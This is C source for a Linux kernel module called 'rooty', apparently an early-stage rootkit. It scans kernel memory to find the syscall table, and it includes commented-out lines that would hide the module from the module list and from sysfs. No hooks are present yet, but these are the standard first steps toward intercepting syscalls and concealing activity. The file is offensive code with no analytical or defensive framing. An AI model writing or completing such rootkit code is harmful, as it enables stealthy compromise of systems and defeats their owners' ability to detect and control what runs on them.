#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

MODULE_LICENSE("Dual BSD/GPL");
int rooty_init(void);
void rooty_exit(void);
module_init(rooty_init);
module_exit(rooty_exit);

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

psize *sys_call_table;
psize **find(void) {
 psize **sctable;
 psize i = START_CHECK;
 while (i < END_CHECK) {
  sctable = (psize **) i;
  if (sctable[__NR_close] == (psize *) sys_close) {
   return &sctable[0];
  }
  i += sizeof(void *);
 }
 return NULL;
}

int rooty_init(void) {
 //list_del_init(&__this_module.list);
 //kobject_del(&THIS_MODULE->mkobj.kobj);
 printk("rooty: module loaded\n");
 if ((sys_call_table = (psize *) find())) {
  printk("rooty: sys_call_table found at %p\n", sys_call_table);
 } else {
  printk("rooty: sys_call_table not found, aborting\n");
 }
 return 0;
}

void rooty_exit(void) {
 printk("rooty: module removed\n");
}
